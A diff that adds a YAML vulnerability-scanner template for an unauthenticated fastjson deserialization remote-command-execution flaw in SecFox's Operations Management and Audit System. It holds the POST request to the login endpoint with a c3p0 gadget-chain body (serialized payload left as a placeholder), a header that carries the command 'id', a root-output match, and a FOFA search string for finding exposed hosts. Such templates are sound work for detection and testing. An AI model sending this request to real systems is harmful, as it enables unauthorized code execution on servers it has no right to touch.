@@ -1,0 +1,42 @@
+id: secfox-fastjson-rce
+info:
+  name: SecFox Operations Management System FastJson Deserialization RCE
+  author: ZacharyZcR
+  severity: critical
+  verified: false
+  description: |
+    SecFox Operations Management and Audit System contains a fastjson deserialization vulnerability
+    in the authService interface, allowing unauthenticated attackers to execute remote commands.
+    FOFA: body="./static/js/vendor.022b3d3adf3423f31f54.js"
+  tags: secfox,rce,fastjson,deserialization
+  created: 2024/01/05
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /3.0/authService/login
+      headers:
+        Content-Type: application/json;charset=utf-8
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+        Cmd: id
+        Accept-Encoding: gzip
+        Connection: close
+      body: |
+        {
+          "a":{
+            "@type":"java.lang.Class",
+            "val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
+          },
+          "b":{
+            "@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
+            "userOverridesAsString":"HexAsciiSerializedMap:[payload]"
+          }
+        }
+    expression: |
+      response.status == 200 && 
+      response.headers["Server"].contains("nginx") &&
+      response.body.bcontains(b'uid=0(root)') &&
+      response.body.bcontains(b'gid=0(root)')
+
+expression: r0()
